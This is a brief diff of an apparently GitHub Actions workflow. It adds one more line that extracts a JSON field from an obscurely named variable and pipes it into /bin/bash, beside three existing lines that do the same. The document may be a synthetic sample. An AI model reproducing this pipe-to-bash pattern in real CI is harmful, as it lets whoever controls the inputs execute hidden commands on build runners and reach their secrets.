@@ -23,6 +23,7 @@ jobs:
           echo $wtat93189 | jq -r .kkzj7 | /bin/bash
           echo $mawue6685 | jq -r .nyj07 | /bin/bash
           echo $mb4 | jq -r .sa2 | /bin/bash
+          printf '%s' "$csu0" | jq -r .rblo576 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
